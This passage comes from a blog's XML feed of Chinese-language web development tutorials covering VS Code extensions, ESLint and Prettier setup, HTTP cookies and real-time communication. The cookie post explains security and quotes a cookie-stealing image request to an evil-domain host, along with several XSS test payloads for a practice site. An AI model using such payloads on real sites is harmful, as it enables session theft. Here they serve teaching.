            <tag> 軟體工程 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>定義屬於你的風格 X VS Code Extensions X ESLint X Prettier</title>
      <link href="/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/"/>
      <url>/2022/09/26/relationships-between-frontend-and-backend/tool-vscode-extensions-with-eslint-and-prettier/</url>
      
        <content type="html"><![CDATA[<h2 id="VS-Code-Extensions"><a href="#VS-Code-Extensions" class="headerlink" title="VS Code Extensions"></a>VS Code Extensions</h2><p><a href="https://marketplace.visualstudio.com/VSCode">VSCode 的市集</a>提供了相當多的 Extensions 能增進工程師的開發效能，Extensions 就像把妹神器，會幫你產出撩妹金句、決定今日穿搭 OOTD、推薦節日可以吃的餐廳或可以送的禮物。</p><p>以程式開發來說，各種語言的 Extension Pack，能快速協助我們進行相關語言的開發</p><ul><li>React Extension Pack</li><li>Node.js Extension Pack</li><li>Extension Pack for Java</li><li>Spring Boot Extension Pack</li></ul><p>協助版本控制的相關外掛則讓版控更親民方便</p><ul><li>GitLens: 方便看出哪一行是誰在什麼時候寫的</li><li>Git Graph: 圖像化 Git 紀錄，熟悉後在操作上會更方便</li></ul><p>這幾年工作下來，會發現各式語法其實蠻多的且不斷在更新，有些細節其實無法全部都記得非常清楚，這時候透過自動完成可以加速開發效率</p><ul><li>Auto Close Tag: 寫網頁或是 jsx 的時候很方便，可以少打很多東西</li><li>Auto Rename Tag: 協助把對稱的自動改好很方便</li><li>Auto Import: 自動 import 要使用的元件或 function</li><li>Path Intellisense: 引入檔案的時候，如果資料都有照邏輯擺，那這個就能加速找檔案過程</li><li>SCSS IntelliSense: 協助寫一些像是 <code>@include</code> 的語法</li></ul><p>語法樣板提供了一個偷吃步，快速的產生相關樣板，開發時只需要進行填空</p><ul><li>HTML Snippets: 有時候在切單純一頁 html 的時候好用</li><li>Reactjs code snippets: 較新的語法可能未支援，優點打 rccp 就可以自動完成元件架構</li><li>React Hooks Snippets</li></ul><p>CSS in JS</p><ul><li>vscode-styled-components</li><li>vscode-styled-jsx: React 開發必備</li></ul><p>記錄代辦事項</p><ul><li>TODO Highlight、TODO Tree: 任務標籤</li></ul><p>在編輯器中將色碼上色的外掛</p><ul><li>Color Highlight: 色碼會幫我們上色</li></ul><p>檢查拼字錯誤的外掛</p><ul><li>Code Spell Checker</li></ul><h2 id="Linting-Formatting"><a href="#Linting-Formatting" class="headerlink" title="Linting &amp; Formatting"></a>Linting &amp; Formatting</h2><ul><li>Lint 可以幫助團隊減少錯誤<ul><li>webhint: 網頁相關提示</li><li>ESLint: 是 linter 用來檢視程式碼的品質，找到可能的錯誤並提示，建議搭配安裝 airbnb 相關配置</li><li><a href="https://marketplace.visualstudio.com/items?itemName=stylelint.vscode-stylelint">StyleLint</a></li><li>Sass Lint</li><li>markdownlint</li></ul></li><li>Formatting 可以統一大家的排版<ul><li>Prettier: 偏向 code formatter 主要專注在排版</li><li>Beautify css&#x2F;sass&#x2F;scss&#x2F;less</li></ul></li><li>Code Spell Checker: 常常英文拼錯但人腦還是可以辨識，改錯字就靠外掛了</li></ul><p>VS Code ESlint + Prettier 厲害的地方在也可以套用 <a href="https://github.com/airbnb/javascript/tree/master/packages/eslint-config-airbnb">airbnb 的 coding style</a>，不然每個人加入團隊前光看 coding style rule 就飽了 Orz</p><h3 id="Prettier"><a href="#Prettier" class="headerlink" title="Prettier"></a>Prettier</h3><p>會需要使用 npm 進行 node_modules 的安裝，相關的使用說明可以參考這篇 <a href="https://linyencheng.github.io/2022/09/27/relationships-between-frontend-and-backend/tool-npm/?utm_source=link&utm_medium=article&utm_campaign=internal_link">NPM 常用指令教學</a>。</p><ol><li><code>npm i prettier -D</code></li><li>加入 <code>.prettierrc</code></li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;tabWidth&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;singleQuote&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>Format 可以設定自動跟手動</li></ol><p>ctrl shift + P 執行 Open Workspace Settings(JSON) 編輯 settings.json</p><p>讓 VS code 在存檔時自動格式化文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;editor.formatOnSave&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>手動的話則建議加入 npm script 較方便</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prittier-fix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;prettier --write \&quot;./&#123;src&#125;/**/&#123;*.js,*.jsx&#125;\&quot;&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ESLint"><a href="#ESLint" class="headerlink" title="ESLint"></a>ESLint</h3><ol><li><code>npx install-peerdeps --dev eslint-config-airbnb</code></li><li><code>npm i -D eslint-config-prettier eslint-plugin-prettier</code></li><li>加入 <code>.eslintrc.js</code> 或 <code>.eslintrc</code> 在根目錄</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 ptettierrc 讀進來套用</span></span><br><span class="line"><span class="keyword">const</span> prettierOptions = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(</span><br><span class="line">  fs.<span class="title function_">readFileSync</span>(path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;.ptettierrc&quot;</span>), <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">export</span> = &#123;</span><br><span class="line">  <span class="comment">// ESLint 預設警告是紅色 (danger) 顯示。</span></span><br><span class="line">  <span class="comment">// Prettier 預設警告也是紅色 (danger) 顯示，不跟 ESLint 混淆，因此改成黃色 (warning) 顯示。</span></span><br><span class="line">  <span class="attr">plugins</span>: [<span class="string">&quot;prettier&quot;</span>],</span><br><span class="line">  <span class="attr">rules</span>: &#123;</span><br><span class="line">    <span class="string">&quot;prettier/prettier&quot;</span>: [<span class="string">&quot;warn&quot;</span>, prettierOptions],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 要把 prettier 放在最後面。</span></span><br><span class="line">  <span class="attr">extends</span>: [</span><br><span class="line">    <span class="comment">// ...,</span></span><br><span class="line">    <span class="string">&quot;prettier&quot;</span>,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>手動執行 ESLint 也建議加入 npm script 較方便</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;lint-fix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eslint . --ext .js --fix&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>有了這個工具就可以快速的自動提示，也可以依照需求 disable 掉一些短時間還來不及改的寫法</p><ul><li>“off” 或 0-關閉規則</li><li>“warn” 或 1-開啟規則，使用警告級別的錯誤：warn(不會導致程序退出)</li><li>“error” 或 2-開啟規則，使用錯誤級別的錯誤：error(當被觸發的時候，程序會退出)</li></ul><p>詳細可以看 <a href="http://eslint.cn/docs/user-guide/configuring">ESLint 網站</a>上的配置教學，比較特別的是也有支援 jsdoc 的提示，對於事情雜亂一堆文件還沒補，有時補東就忘了西的人來說，真的是個優秀的發明。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;extends&quot;</span><span class="punctuation">:</span> <span class="string">&quot;airbnb&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;browser&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;es6&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mocha&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;one-var&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;no-var&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;prefer-template&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;valid-jsdoc&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;error&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;requireReturn&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;requireReturnType&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;requireParamDescription&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;requireReturnDescription&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;require-jsdoc&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;error&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;FunctionDeclaration&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;MethodDefinition&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;ClassDeclaration&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 軟體工程 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用 HTTP Cookies 記住你的曾經</title>
      <link href="/2022/09/24/relationships-between-frontend-and-backend/js-cookies/"/>
      <url>/2022/09/24/relationships-between-frontend-and-backend/js-cookies/</url>
      
        <content type="html"><![CDATA[<h2 id="為什麼需要-Cookie"><a href="#為什麼需要-Cookie" class="headerlink" title="為什麼需要 Cookie"></a>為什麼需要 Cookie</h2><p>在前兩篇文章小編介紹了<a href="https://linyencheng.github.io/2022/09/22/relationships-between-frontend-and-backend/js-http-client-with-ajax/">非同步 AJAX</a>和<a href="https://linyencheng.github.io/2022/09/23/relationships-between-frontend-and-backend/js-realtime-communication/">網頁即時通訊技術</a>，可以發現前後端 API 的溝通只關注在 “傳入” 和 “傳出” 或 “事件”，過程中 HTTP 的溝通並沒有包含狀態。</p><p>所以若重新整理或再次開啟相關頁面需回到上一次的狀態時，Cookie 提供狀態的存放空間來恢復前一次瀏覽。</p><p>瀏覽器雖然有提供 localStorage、sessionStorage、IndexedDB，但 Cookie 有個特殊的預設行為是每次都會跟著請求回到伺服器。</p><p>是不是常常被另外一半說，我講過了你都沒在聽，或是你上次跟我講過了你都不記得?</p><p>Cookie 可以幫助你在回應時，結合一些 “記起來” 的東西到回應裡，但實際上人與人之間該怎麼做? That is a question QQ</p><h3 id="Cookie-使用場景"><a href="#Cookie-使用場景" class="headerlink" title="Cookie 使用場景"></a>Cookie 使用場景</h3><p>商業上: Cookie 因為會跟著請求回到伺服器這個特性，常被用來紀錄特定的消費者行為<br>流程上: 會記錄帳號相關狀態，常見的第三方登入狀態儲存就會運用到 Cookie，那 Cookie 要存多久? 存多久要依照商業邏輯而定，譬如希望用戶一天內不需重新登入就可以設定一天<br>個人化: 不想存進去資料庫但又想要客製的部分</p><h3 id="Cookie-安全問題"><a href="#Cookie-安全問題" class="headerlink" title="Cookie 安全問題"></a>Cookie 安全問題</h3><p>首先最簡單的是如果函式庫 CDN 的來源如果是不安全的 (來源是來自海峽對岸，內建固定把資料傳回北京?</p><p>今天只要 CDN 的函式庫被駭客駭掉了，當連結不變及原有的封裝不變的前題下，裡面簡單放一些偷資訊的程式碼，也許在你一定會按到的按鈕上面又加上 onClick 事件，在你按下去的過程中，資料就會在沒有注意到的情況下被送出去了。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">MDN 的文件</a>上直接說這樣的機制本身是不安全的，但比起使用瀏覽器本身的 storage，Cookie 至少還有參數可以設定，主要都是想辦法讓我們的 script 可以在其他人的網站執行。</p><h2 id="Cookie-實作"><a href="#Cookie-實作" class="headerlink" title="Cookie 實作:"></a>Cookie 實作:</h2><p>Cookie 若從設定來看可以粗分成兩種，那個參數就是 HttpOnly</p><ul><li>有 HttpOnly: 由伺服器產生，只有伺服器端可以進行操作</li><li>無 HttpOnly: 透過 <code>document.cookie</code> 來存取，可以從瀏覽器端透過程式來操作，會有 XSS 問題</li></ul><p>運用 Express 從 Server 端設定 Cookie 的方式也很簡單，關鍵就是知道有哪幾個參數。</p><ul><li>domain: 鎖使用網域</li><li>path: 鎖使用路徑</li><li>secure: HTTPS 才可以使用</li><li>expires: 設定為常駐的 Cookie 會在特定日期消失</li><li>maxAge: 設定為常駐的 Cookie 會在一個時間長度後消失</li><li>encode: 預設是 encodeURIComponent</li><li>httpOnly: 只有伺服器端可以存取</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="title class_">Cookie</span>(<span class="string">&quot;rememberme&quot;</span>, <span class="string">&quot;1&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">domain</span>: <span class="string">&quot;example.com&quot;</span>,</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&quot;/admin&quot;</span>,</span><br><span class="line">  <span class="comment">// HTTPS</span></span><br><span class="line">  <span class="attr">secure</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// 常駐的 Cookie 在什麼時候到期</span></span><br><span class="line">  <span class="attr">expires</span>: <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() + <span class="number">900000</span>),</span><br><span class="line">  <span class="comment">// 不會出現 %</span></span><br><span class="line">  <span class="attr">encode</span>: <span class="title class_">String</span>,</span><br><span class="line">  <span class="comment">// 只能伺服器端存取</span></span><br><span class="line">  <span class="attr">httpOnly</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;);</span><br><span class="line">res.<span class="title class_">Cookie</span>(</span><br><span class="line">  <span class="string">&quot;cart&quot;</span>,</span><br><span class="line">  &#123; <span class="attr">items</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 可維持最大時間，同 expires: new Date(Date.now() + 900000)</span></span><br><span class="line">    <span class="attr">maxAge</span>: <span class="number">900000</span>,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="Cookie-安全機制"><a href="#Cookie-安全機制" class="headerlink" title="Cookie 安全機制"></a>Cookie 安全機制</h2><p>由於 Cookie 會隨著請求一起回到伺服器，想到的安全機制有</p><ul><li>Cookie 有 Domain 以及路徑的來控制作用範圍</li><li>設計拿取敏感資料的 Token 限使用一次、綁定裝置的 Fingerprint 甚至是 IP 位置</li></ul><p>在 MDN 文件中有個殭屍 Cookie 或是 Facebook 像素我覺得也是類似的概念，都是用來鎖定使用者。</p><p>可以做到在使用者做任何動作的時候，就同時把這樣的動作和這個 ID 進行綁定，這樣一來只要下次又發現這個 id 我們就可以進行對應行動。</p><p>不過當代函式庫像是 React 就會<a href="https://reactjs.org/docs/dom-elements.html">特別註明 dangerously 像是這個 dangerouslySetInnerHTML</a>，這就代表是會執行的部分。</p><p>假設今天被埋了一張假的圖片，底下是 MDN 上的範例，這樣似乎代表圖片載入的時候，我們的 Cookie 也爆露了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> =</span><br><span class="line">  <span class="string">&quot;http://www.evil-domain.com/steal-Cookie.php?Cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">Cookie</span>;</span><br></pre></td></tr></table></figure><p>底下有一個網站可以讓大家練習，透過輸入框的輸入來執行我們的腳本。</p><p><a href="http://xss-quiz.int21h.jp/">http://xss-quiz.int21h.jp/</a></p><ul><li><code>aaa&lt;bbb&gt;ccc/ddd&#39;eee&quot;fff;ggg:hhh</code></li><li><code>&lt;script&gt; alert(document.domain) &lt;/script&gt;</code></li><li><code>&quot;&gt;&lt;script&gt; alert(document.domain) &lt;/script&gt;</code></li></ul><p>在測試的過程中發現 Chrome 超厲害竟然會自己偵測危險，也許是這樣的錯誤太低級了，當我們在瀏覽器裡面停用 Cookie 的時候 sessionStorage 跟 localStorage 也會被擋，那重新整理又需要狀態怎麼辦，Facebook 的解決方法是把你登出，</p>]]></content>
      
      
      <categories>
          
          <category> 前後端如何和平相處 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> 前後端如何和平相處 </tag>
            
            <tag> 2022ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>網頁即時通訊實作 X Long-Polling, Server Sent Events, WebSockets</title>
      <link href="/2022/09/23/relationships-between-frontend-and-backend/js-realtime-communication/"/>
      <url>/2022/09/23/relationships-between-frontend-and-backend/js-realtime-communication/</url>
      
        <content type="html"><![CDATA[<p>在另外一篇文章小編介紹了怎麼透過<a href="https://linyencheng.github.io/2022/09/22/relationships-between-frontend-and-backend/js-http-client-with-ajax/">非同步 AJAX 的方式</a>跟伺服器進行溝通，那需要即時的同步溝通怎麼辦?</p><p>這篇文章接著會介紹可以做到網頁即時通訊服務的技術：</p><ul><li>Long-Polling: 長時間輪詢</li><li><a href="https://developer.mozilla.org/zh-TW/docs/Web/API/Server-sent_events/Using_server-sent_events">Server Sent Events</a>: 伺服器傳送事件</li><li><a href="https://zh.wikipedia.org/wiki/WebSocket">WebSocket</a>: 全雙工通訊</li><li><del>Forever Frame: IE only，嵌入一個 IFrame，連向 SignalR 提供的內容</del></li></ul><p>API 在系統設計上是為了溝通而產生的，而非同步溝通技術較為簡單且容易實作，即時通訊則需要較多層面的情境與技術考量。</p><p>以男女之間來說，非同步的溝通比較容易造就產生時間管理大師，即時通訊則相對較為困難。</p><h2 id="即時通訊原理"><a href="#即時通訊原理" class="headerlink" title="即時通訊原理"></a>即時通訊原理</h2><p>在 2010 年 Chrome 開始支援了新的即時通訊 API 後 Web App 開始走向全新的時代，概念上從雙方通訊的方式可以分成下面三種：</p><ul><li>單工：訊號只在一個方向上進行傳遞，像是寫情書給喜歡的女生</li><li>雙工: 允許雙向資料傳輸，像是曖昧期的相處<ul><li>半雙工：可切換方向的單工通訊，像是只有一方有意思的時候，訊息通常是單向的</li><li>全雙工：現在即時通訊，即將熱戀中的男女，雙方同時接收或是傳送訊息</li></ul></li></ul><p>非同步溝通: 屬於單工或半雙工，注重的會是資訊的 “傳入” 以及 “傳出”<br>即時通訊: 全雙工，注重的會是 “監聽事件” 以及 “發出事件”</p><h2 id="Long-Polling"><a href="#Long-Polling" class="headerlink" title="Long-Polling"></a>Long-Polling</h2><p>從翻譯來看就是比較長的 Polling，用途其實是以舊的 AJAX 技術模擬即時通訊的效果。</p><ul><li>Polling: 前端向後端發出請求，如果沒拿到想要的資料就重發，伺服器附載較重</li><li>Long-Polling:<ol><li>Client 發 Request 給 Server</li><li>Server 送 Response 給 Client 後才斷開連線 (降低伺服器負擔但占用連線數)</li><li>Client 收到後再發 Request 給 Sevrer</li></ol></li></ul><p>Polling 像是奪命連環 Call 會一直 Call 到有反應為止，就像正妹的 Line 打開永遠都是 999+ 未讀未接一樣，負擔其實很大。</p><p>Long-Polling 會是優化版本的，正妹雖然有好幾個通訊軟體，雖然打 Line 過去後被 Mute (因為切去用 Messenger)，但至少可以確定之後會回。</p><p>以下為 Long-Polling 實作範例程式碼:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> timeout;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">valueChanged</span>(<span class="params">value</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">dispatch</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">dispatch</span>(<span class="title function_">loadSuggestionsInProgress</span>());</span><br><span class="line">    <span class="title function_">dispatch</span>(&#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;VALUE_CHANGED&quot;</span>,</span><br><span class="line">      <span class="attr">payload</span>: &#123;</span><br><span class="line">        value,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一秒內有值改變就清除且在重設 timeout</span></span><br><span class="line">    timeout &amp;&amp; <span class="built_in">clearTimeout</span>(timeout);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 一秒後再打一次</span></span><br><span class="line">    timeout = <span class="built_in">setTimeout</span>(</span><br><span class="line">      <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        axios</span><br><span class="line">          .<span class="title function_">get</span>(<span class="string">`/suggestions?q=<span class="subst">$&#123;value&#125;</span>`</span>)</span><br><span class="line">          .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span></span><br><span class="line">            <span class="title function_">dispatch</span>(<span class="title function_">loadSuggestionsSuccess</span>(response.<span class="property">data</span>.<span class="property">suggestions</span>))</span><br><span class="line">          )</span><br><span class="line">          .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> <span class="title function_">dispatch</span>(<span class="title function_">loadSuggestionsFailed</span>()));</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="number">1000</span>,</span><br><span class="line">      value</span><br><span class="line">    );</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Server-Sent-Events-實作"><a href="#Server-Sent-Events-實作" class="headerlink" title="Server Sent Events 實作"></a>Server Sent Events 實作</h2><p>網頁一般來說是由客戶端向伺服器請求資料。</p><p>藉由 server-sent 事件, 伺服器在任何時候都可以向客戶端推送資料，推送進來的訊息可以在客戶端上做事件與資料的處理。</p><p>另外一種方式是使用<a href="https://linyencheng.github.io/2021/09/26/progressive-web-application/pwa-push-notificatoin-introduction/?utm_source=link&utm_medium=article&utm_campaign=internal_link">Service Worker</a> 可透過 <a href="https://developer.mozilla.org/en-US/docs/Web/API/PushManager">PushManager</a> 一起搭配實作離線推播，不過為獨立 Thread 無法操作 dom。</p><p>Server Sent Events 比較像是正妹找工具人的概念，工具人們都會等待正妹的指令，指令一下就會進行動作。</p><p>以下為 Server Sent Events 實作範例程式碼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Server</span></span><br><span class="line"><span class="keyword">let</span> clients = [];</span><br><span class="line"><span class="keyword">const</span> server = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sendEventsToClients</span>(<span class="params"></span>) &#123;</span><br><span class="line">  clients.<span class="title function_">forEach</span>(<span class="function">(<span class="params">c</span>) =&gt;</span> &#123;</span><br><span class="line">    c.<span class="property">res</span>.<span class="title function_">write</span>(<span class="string">`change`</span>);</span><br><span class="line">  &#125;);</span><br><span 